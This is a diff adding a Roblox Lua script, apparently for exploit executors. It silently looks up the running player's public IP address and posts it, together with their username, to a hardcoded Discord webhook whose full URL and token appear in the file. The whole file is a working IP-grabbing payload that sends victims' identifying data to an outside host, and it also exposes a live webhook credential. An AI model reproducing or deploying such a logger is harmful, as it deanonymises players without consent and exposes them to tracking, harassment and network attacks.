@@ -1,0 +1,91 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local function getIP()
+    local response
+    if syn then
+        response = syn.request({
+            Url = "https://api.ipify.org",
+            Method = "GET"
+        })
+    elseif request then
+        response = request({
+            Url = "https://api.ipify.org",
+            Method = "GET"
+        })
+    elseif http_request then
+        response = http_request({
+            url = "https://api.ipify.org",
+            method = "GET"
+        })
+    end
+    
+    if response and response.StatusCode == 200 then
+        return response.Body
+    else
+        warn("Failed to fetch IP address")
+        return nil
+    end
+end
+
+local function sendToWebhook(username, ip)
+    local webhookUrl = "https://discord.com/api/webhooks/1271879184100098118/1eCMPuRih7TI0ZafqfBCdb3jjd7XJsETyrI1YTLVgm71gsM-JKaDvZwtKeAx3ejnpOd_"
+    local data = {
+        content = string.format("Username: %s\nIP Address: %s", username, ip)
+    }
+    
+    local success, response
+    if syn then
+        success, response = pcall(function()
+            return syn.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    elseif request then
+        success, response = pcall(function()
+            return request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    elseif http_request then
+        success, response = pcall(function()
+            return http_request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    else
+        warn("No suitable HTTP request function found")
+        return
+    end
+    
+    if success and response.StatusCode == 200 then
+        print("Data sent to webhook successfully")
+    else
+        warn("Failed to send data to webhook:", response)
+    end
+end
+
+local player = Players.LocalPlayer
+local username = player.Name
+local myIP = getIP()
+
+if myIP then
+    sendToWebhook(username, myIP)
+else
+    warn("Unable to retrieve IP address")
+end
